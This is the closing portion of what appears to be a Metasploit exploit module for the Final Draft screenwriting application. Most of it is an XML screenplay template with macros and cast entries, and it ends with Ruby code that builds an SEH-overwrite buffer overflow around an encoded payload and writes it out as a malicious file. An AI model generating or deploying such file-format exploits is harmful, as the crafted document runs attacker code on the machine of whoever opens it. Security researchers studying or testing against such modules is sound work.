</Alias>
</Macro>
<Macro Element="None" Name="Start Teaser" Shortcut="E" Text="TEASER" Transition="Scene Heading">
<Alias Confirm="Yes" MatchCase="No" SmartReplace="Yes" Text="st1" WordOnly="No">
<ActivateIn Element="General"/>
<ActivateIn Element="Scene Heading"/>
<ActivateIn Element="Action"/>
<ActivateIn Element="Character"/>
<ActivateIn Element="New Act"/>
<ActivateIn Element="Teaser/Act One"/>
<ActivateIn Element="Show/Ep. Title"/>
</Alias>
</Macro>
<Macro Element="End Of Act" Name="End Teaser" Shortcut="E" Text="END OF TEASER" Transition="New Act">
<Alias Confirm="Yes" MatchCase="No" SmartReplace="Yes" Text="et1" WordOnly="No">
<ActivateIn Element="General"/>
<ActivateIn Element="Scene Heading"/>
<ActivateIn Element="Action"/>
<ActivateIn Element="Dialogue"/>
<ActivateIn Element="Transition"/>
<ActivateIn Element="Shot"/>
<ActivateIn Element="End Of Act"/>
</Alias>
</Macro>
<Macro Element="New Act" Name="Start Act 1" Shortcut="E" Text="ACT ONE" Transition="Scene Heading">
<Alias Confirm="Yes" MatchCase="No" SmartReplace="Yes" Text="sa1" WordOnly="No">
<ActivateIn Element="General"/>
<ActivateIn Element="Scene Heading"/>
<ActivateIn Element="Action"/>
<ActivateIn Element="Character"/>
<ActivateIn Element="New Act"/>
<ActivateIn Element="Teaser/Act One"/>
<ActivateIn Element="Show/Ep. Title"/>
</Alias>
</Macro>
<Macro Element="End Of Act" Name="End Act 1" Shortcut="E" Text="END OF ACT ONE" Transition="New Act">
<Alias Confirm="Yes" MatchCase="No" SmartReplace="Yes" Text="ea1" WordOnly="No">
<ActivateIn Element="General"/>
<ActivateIn Element="Scene Heading"/>
<ActivateIn Element="Action"/>
<ActivateIn Element="Dialogue"/>
<ActivateIn Element="Transition"/>
<ActivateIn Element="Shot"/>
<ActivateIn Element="End Of Act"/>
</Alias>
</Macro>
<Macro Element="New Act" Name="Start Act 2" Shortcut="E" Text="ACT TWO" Transition="Scene Heading">
<Alias Confirm="Yes" MatchCase="No" SmartReplace="Yes" Text="sa2" WordOnly="No">
<ActivateIn Element="General"/>
<ActivateIn Element="Scene Heading"/>
<ActivateIn Element="Action"/>
<ActivateIn Element="Character"/>
<ActivateIn Element="New Act"/>
</Alias>
</Macro>
<Macro Element="End Of Act" Name="End Act 2" Shortcut="E" Text="END OF ACT TWO" Transition="New Act">
<Alias Confirm="Yes" MatchCase="No" SmartReplace="Yes" Text="ea2" WordOnly="No">
<ActivateIn Element="General"/>
<ActivateIn Element="Scene Heading"/>
<ActivateIn Element="Action"/>
<ActivateIn Element="Dialogue"/>
<ActivateIn Element="Transition"/>
<ActivateIn Element="Shot"/>
<ActivateIn Element="End Of Act"/>
</Alias>
</Macro>
<Macro Element="New Act" Name="Start Act 3" Shortcut="E" Text="ACT THREE" Transition="Scene Heading">
<Alias Confirm="Yes" MatchCase="No" SmartReplace="Yes" Text="sa3" WordOnly="No">
<ActivateIn Element="General"/>
<ActivateIn Element="Scene Heading"/>
<ActivateIn Element="Action"/>
<ActivateIn Element="Character"/>
<ActivateIn Element="New Act"/>
</Alias>
</Macro>
<Macro Element="End Of Act" Name="End  Act 3" Shortcut="E" Text="END OF ACT THREE" Transition="New Act">
<Alias Confirm="Yes" MatchCase="No" SmartReplace="Yes" Text="ea3" WordOnly="No">
<ActivateIn Element="General"/>
<ActivateIn Element="Scene Heading"/>
<ActivateIn Element="Action"/>
<ActivateIn Element="Dialogue"/>
<ActivateIn Element="Transition"/>
<ActivateIn Element="Shot"/>
<ActivateIn Element="End Of Act"/>
</Alias>
</Macro>
<Macro Element="New Act" Name="Start Act 4" Shortcut="E" Text="ACT FOUR" Transition="Scene Heading">
<Alias Confirm="Yes" MatchCase="No" SmartReplace="Yes" Text="sa4" WordOnly="No">
<ActivateIn Element="General"/>
<ActivateIn Element="Scene Heading"/>
<ActivateIn Element="Action"/>
<ActivateIn Element="Character"/>
<ActivateIn Element="New Act"/>
</Alias>
</Macro>
<Macro Element="End Of Act" Name="End Act 4" Shortcut="E" Text="END OF ACT FOUR" Transition="None">
<Alias Confirm="Yes" MatchCase="No" SmartReplace="Yes" Text="ea4" WordOnly="No">
<ActivateIn Element="General"/>
<ActivateIn Element="Scene Heading"/>
<ActivateIn Element="Action"/>
<ActivateIn Element="Dialogue"/>
<ActivateIn Element="Transition"/>
<ActivateIn Element="Shot"/>
<ActivateIn Element="End Of Act"/>
</Alias>
</Macro>
</Macros>
<Actors>
<Actor MacVoice="" Name="Man 1" Pitch="Normal" Speed="Medium" WinVoice=""/>
<Actor MacVoice="" Name="Man 2" Pitch="Normal" Speed="Medium" WinVoice=""/>
<Actor MacVoice="" Name="Woman 1" Pitch="Normal" Speed="Medium" WinVoice=""/>
<Actor MacVoice="" Name="Woman 2" Pitch="Normal" Speed="Medium" WinVoice=""/>
<Actor MacVoice="" Name="Boy 1" Pitch="Normal" Speed="Medium" WinVoice=""/>
<Actor MacVoice="" Name="Boy 2" Pitch="Normal" Speed="Medium" WinVoice=""/>
<Actor MacVoice="" Name="Girl 1" Pitch="Normal" Speed="Medium" WinVoice=""/>
<Actor MacVoice="" Name="Girl 2" Pitch="Normal" Speed="Medium" WinVoice=""/>
<Actor MacVoice="" Name="Old Man" Pitch="Normal" Speed="Medium" WinVoice=""/>
<Actor MacVoice="" Name="Old Woman" Pitch="Normal" Speed="Medium" WinVoice=""/>
</Actors>
<Cast>
<Narrator Actor="Man 1">
<Element Type="Character"/>
<Element Type="Dialogue"/>
</Narrator>
<Member Actor="Man 1" Character="Brennan"/>
<Member Actor="Man 1" Character="DR. JACK HODGINS"/>
<Member Actor="Man 1" Character="Special agent booth"/>
<Member Actor="Man 1" Character="Angela"/>
<Member Actor="Man 1" Character="CAMILLE"/>
</Cast>
<SceneNumberOptions LeftLocation="0.75" RightLocation="7.38" ShowNumbersOnLeft="Yes" ShowNumbersOnRight="Yes">
<FontSpec AdornmentStyle="0" Background="#FFFFFFFFFFFF" Color="#000000000000" Font="Courier Final Draft" RevisionID="0" Size="12" Style=""/>
</SceneNumberOptions>
</FinalDraft>
|

		seh = "\x77\x72\x78" # is null terminated
		nseh = "\x49\x39\x22\x77" # this address + 16h points to the stack
		sploit = template.gsub(/REPLACE_1/, "\x40"*7756+payload.encoded+("\x41"*(2268-payload.encoded.length))+nseh+seh)

		print_status("Creating '#{datastore['FILENAME']}' file ...")

		file_create(sploit)

	end

end
